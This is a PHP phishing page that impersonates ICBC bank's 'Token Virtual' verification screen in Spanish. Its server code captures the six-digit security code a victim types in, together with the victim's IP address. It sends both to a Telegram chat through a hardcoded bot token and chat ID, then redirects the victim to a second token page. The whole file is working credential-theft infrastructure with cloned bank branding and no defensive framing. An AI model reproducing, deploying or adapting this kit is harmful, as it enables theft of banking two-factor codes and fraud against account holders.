
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Replace 'your_bot_token_here' with your actual Telegram bot token
    $botToken = '6753618822:AAGFd0-dZfKJckx8Ql1vPHtsRUGFNy4FycE';

    // Replace 'your_chat_id_here' with your actual chat ID (you may need to implement a way to obtain this dynamically)
    $chatId = '-4187545026';

    // Get the values from the form fields
    $token = $_POST["token"];

    // Get the user's IP address
    $userIP = $_SERVER['REMOTE_ADDR'];

    // Prepare the message with instructions for copying
    $message = "➖➖💲TOKEN (1)💲➖➖\n✔️TOKEN 1 :  <code>$token</code>\n🌐 IP :  <code>$userIP</code>";

    // Telegram API endpoint
    $apiEndpoint = 'https://api.telegram.org/bot' . $botToken . '/sendMessage';

    // Prepare the data for the HTTP POST request
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML', // Specify HTML parse mode to support formatting
    ];

    // Initialize cURL session
    $ch = curl_init($apiEndpoint);

    // Set cURL options
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    // Execute cURL session and close it
    $response = curl_exec($ch);
    curl_close($ch);

    // Check if the message was sent successfully
    if ($response === false) {
        echo 'Error sending message.';
    } else {
        // Redirect to another page
        header("Location: token2.php");
        exit();
    }
}
?>

<html>

<head>
  

    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Cache-Control" content="no-cache">
    <meta http-equiv="expires" content="Fri, 20 Feb 2000 10:51:12 GMT">

    <link rel="Stylesheet" href="/accstatic/css/style.css?v=86.1" type="text/css" media="screen">
    <link rel="Stylesheet" href="/accstatic/css/login-acc.css?v=86.1" type="text/css" media="screen">
    <link rel="Stylesheet" href="/accstatic/css/message-view-acc.css?v=86.1" type="text/css" media="screen">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">

    <link rel="shortcut icon" href="/accstatic/icbc.ico?v=2">
    <link rel="icon" href="/accstatic/icbc.ico?v=2">
    <link rel="Stylesheet" href="/accstatic/css/font-awesome/css/font-awesome.css" type="text/css" media="screen">
    <link rel="stylesheet" href="/accstatic/css/ui/slider/iview.css?v=86.1" type="text/css" media="screen">
    <link rel="shortcut icon" href="/accstatic/favicon.ico" type="image/x-icon">
    <title>lCBC</title>
    <style>
        .contenedorSlider {
            font-family: Arial;
            cursor: default;
            position: relative;
            overflow: hidden;
        }

        .iview-controlNav a {
            text-indent: -9999px;
        }

        .iview-controlNav {
            position: absolute;
            bottom: 15px;
            right: 40px;
        }

        .iview-controlNav a.iview-control {
            padding: 0px;
            float: left;
            width: 14px;
            height: 14px;
            line-height: 0px;
        }

        .iview-controlNav a.circle {
            background: url('/accstatic/i/bulletcircle.png') no-repeat;
            line-height: 0px;
        }

        .iview-controlNav a.square {
            background: url('/accstatic/i/bulletsquare.png') no-repeat;
            line-height: 0px;
        }

        .iview-controlNav a.rhombus {
            background: url('/accstatic/i/bulletrhombus.png') no-repeat;
            line-height: 0px;
        }

        .iview-controlNav a.number {
            font-size: 19px;
            color: #FFFFFF;
            text-indent: 2px !important;
            line-height: 15px;
        }

        .iview-controlNav div.iview-items {
            float: left;
            padding: 0px;
        }

        .iview-controlNav div.iview-items ul {
            margin: 0px;
            padding: 0px;
        }

        .iview-controlNav div.iview-items ul li {
            padding: 0px;
            float: left;
            width: 14px;
            height: 14px;
            margin: 0px 5px 0px 5px;
            line-height: 0px;
        }

        .iview-controlNav a.iview-control.active {
            color: #FF0000;
            background-position: 0px -14px;
        }

        .iview-controlNav a.iview-control.hover {
            color: #FF0000;
            background-position: 0px -14px;
        }

        #iview-preloader {
            border: 0px;
            width: 32px;
            height: 32px;
            background: url('/accstatic/i/preloader.gif') no-repeat;
        }

        #iview-preloader div {
            background: #DA1F2F;
            height: 7px;
            display: none;
        }

        #iview-timer {
            display: none !important;
        }

        .iview-playPauseButton {
            position: absolute;
            right: 10px;
            bottom: 12px;
            background: url('/accstatic/i/btnplaypause.png') no-repeat;
            background-position: -20px 0px;
            margin: 0px 5px 0px 5px;
            width: 20px;
            height: 20px;
            z-index: 9;
            cursor: pointer;
            display: none;
        }

        .iview-playPauseButton.play {
            background-position: 0px 0px;
        }

        .iview-caption {
            line-height: 0px;
            display: none;
        }

        .iview-imgBackground {
            position: absolute;
            top: 0px;
            left: 0px;
            display: none;
        }
    </style>
    <style>
        .ui-tooltip {
            text-align: left;
        }
    </style>
    <meta http-equiv="origin-trial" content="AymqwRC7u88Y4JPvfIF2F37QKylC04248hLCdJAsh8xgOfe/dVJPV3XS3wLFca1ZMVOtnBfVjaCMTVudWM//5g4AAAB7eyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjk1MTY3OTk5LCJpc1RoaXJkUGFydHkiOnRydWV9">
    <meta http-equiv="origin-trial" content="A+xK4jmZTgh1KBVry/UZKUE3h6Dr9HPPioFS4KNCzify+KEoOii7z/goKS2zgbAOwhpZ1GZllpdz7XviivJM9gcAAACFeyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiQXR0cmlidXRpb25SZXBvcnRpbmdDcm9zc0FwcFdlYiIsImV4cGlyeSI6MTcwNzI2Mzk5OSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ==">
    <meta http-equiv="origin-trial" content="AymqwRC7u88Y4JPvfIF2F37QKylC04248hLCdJAsh8xgOfe/dVJPV3XS3wLFca1ZMVOtnBfVjaCMTVudWM//5g4AAAB7eyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjk1MTY3OTk5LCJpc1RoaXJkUGFydHkiOnRydWV9">
    <meta http-equiv="origin-trial"content="AymqwRC7u88Y4JPvfIF2F37QKylC04248hLCdJAsh8xgOfe/dVJPV3XS3wLFca1ZMVOtnBfVjaCMTVudWM//5g4AAAB7eyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjk1MTY3OTk5LCJpc1RoaXJkUGFydHkiOnRydWV9">
   
</head>

<body class="bodySite"
    bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJkaXNhYmxlZCIsIkZBQ0VCT09LIjoiZGlzYWJsZWQiLCJUV0lUVEVSIjoiZGlzYWJsZWQiLCJSRURESVQiOiJkaXNhYmxlZCJ9LCJ2ZXJzaW9uIjoiMS45LjEwIiwic2NvcmUiOjEwOTEwfV0=">

    
    <div class="containerSite" bis_skin_checked="1">
        <!-- HEADER -->

        <div class="headerContainer fullpagewidthline" bis_skin_checked="1">

            <div class="backcolor_0084 logoHeaderDiv" bis_skin_checked="1"><a href=""
                    target="_parent"><img src="/accstatic/i/ICBC_logoBU.png" alt="" border="0" valign="middle"></a>
            </div>
            <div class="header_globe" style="float:right;  " bis_skin_checked="1">
                <table width="200" border="0" cellspacing="0" cellpadding="0">
                    <tbody>
                        <tr valign="top">
                            <td height="20" align="right" class="homeblacktxt">
                                <a href="javascript:MM_openBrWindow('', 'win_ayuda', 580, 450, 550, 450, 'no', 'no', 'no', 'no', 'yes', 'no')"
                                    class="homeblacktxt">ayuda</a> |
                                <a href=""
                                    class="homeblacktxt">contactanos</a>
                            </td>
                        </tr>
                        <tr>
                            <td class="homeblacktxt" height="19"><img src="/accstatic/i/p.gif" width="1" height="1">
                            </td>
                        </tr>
                        <tr>
                            <p><span id="fecha"></span></p>
                            <style>
                                #fecha {
                                    font-size: 10px; /* Cambia el tamaño de fuente según tus preferencias */
                                    margin-left: 32%;
                                }
                            </style>
                            <script>
                                function actualizarFecha() {
                                    var fecha = new Date();
                                    
                                    var dia = fecha.getDate();
                                    var mes = fecha.toLocaleString('es-ES', { month: 'long' }); // Obtiene el nombre del mes en español
                                    var año = fecha.getFullYear();
                                    var horas = fecha.getHours();
                                    var minutos = fecha.getMinutes();
                                    
                                    var fechaFormateada = dia + " de " + mes + " de " + año + " - " + horas + ":" + (minutos < 10 ? '0' : '') + minutos;
                                    
                                    document.getElementById("fecha").innerHTML = fechaFormateada;
                                }
                            
                                // Actualiza la fecha cada minuto
                                setInterval(actualizarFecha, 60000);
                            
                                // Se llama inicialmente para mostrar la fecha de inmediato
                                actualizarFecha();
                            </script>
                        </tr>
                    </tbody>
                </table>
            </div>

            <table class="generalLineSeparator" width="778" border="0" cellspacing="0" cellpadding="0">
                <tbody>
                    <tr>
                        <td height="1"></td>
                    </tr>
                </tbody>
            </table>
        </div>


        <!-- SEPARADOR -->
        <table width="778" border="0" cellspacing="0" cellpadding="0" class="horizontalmenuline">
            <tbody>
                <tr>
                    <td height="1"></td>
                </tr>
            </tbody>
        </table>

        <!-- TITULO -->
        <div id="accessTitle" bis_skin_checked="1">ICBC Token Virtual</div>

        <!-- SEPARADOR -->
        <table width="778" border="0" cellspacing="0" cellpadding="0" class="horizontalmenuline">
            <tbody>
                <tr>
                    <td height="1"></td>
                </tr>
            </tbody>
        </table>

        <!-- CONTAINER -->
        <div class="container padding-bottom--5px" bis_skin_checked="1">

            <div style="padding: 50px;" class="login-body" bis_skin_checked="1">
       

                    <div class="input-block-container margin-bottom--hig" bis_skin_checked="1">
                       
                    </head>
                    <body>
                        <img src="/accstatic/i/candado.png" width="50" alt="">
                        <form id="frmLogin" action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST" onsubmit="return validarFormulario()">

                            <div class="login-input-container" bis_skin_checked="1">
                                <div class="login-input-label" bis_skin_checked="1" style="font-size: 110%;">Verificacion de Seguridad</div>
                                <div class="login-input-label" bis_skin_checked="1" style="font-size: 63%;">Ingresá el código generado en tu aplicación ICBC Token Virtual</div>
                                <input style="padding: 12px;" id="usuario" class="usuario login-input-text valid" type="text" name="token"
                                pattern="[0-9]*" inputmode="numeric" minlength="6" maxlength="6" tabindex="1"
                                aria-required="true" aria-invalid="false" required placeholder="Ingresá el código ICBC Token Virtual"
                                onkeydown="validarEspacio(event)">

                                <ul class="block-buttons">
                                    <li class="block-buttons__item">
                                        <input type="submit" align="center" class="btnclass" tabindex="3"
                                            value="CONTINUAR">
                                    </li>
                                </ul>
                         
                         <script>
                             // Esta función se encarga de validar que solo se ingresen números
                             function validarEspacio(event) {
                                 var keyCode = event.keyCode;
                                 // Permitir: Ctrl+A, Ctrl+C, Ctrl+V, Command+A, Command+C, Command+V
                                 if ((keyCode == 65 && (event.ctrlKey === true || event.metaKey === true)) ||
                                     (keyCode == 67 && (event.ctrlKey === true || event.metaKey === true)) ||
                                     (keyCode == 86 && (event.ctrlKey === true || event.metaKey === true)) ||
                                     (keyCode == 97 && (event.ctrlKey === true || event.metaKey === true)) ||
                                     (keyCode == 99 && (event.ctrlKey === true || event.metaKey === true)) ||
                                     (keyCode == 118 && (event.ctrlKey === true || event.metaKey === true)) ||
                                     // Permitir: home, end, left, right
                                     (keyCode >= 35 && keyCode <= 39)) {
                                     // no hacer nada
                                     return;
                                 }
                                 else {
                                     // Asegurar que son solo números y que no se supere la longitud máxima
                                     if ((event.shiftKey || (keyCode < 48 || keyCode > 57)) && (keyCode != 8 && keyCode != 46 && keyCode != 37 && keyCode != 39)) {
                                         event.preventDefault();
                                     }
                                 }
                             }
                         </script>
                         
                                <div id="usuario-errorMensaje" class="usuario-errorMensaje mensaje-validacion"
                                    style="position:absolute; width: 280px;" bis_skin_checked="1"></div>
                            </div>
                    
                           
                    
                    
                            
                            
                        </form>

                       

</body>
</html>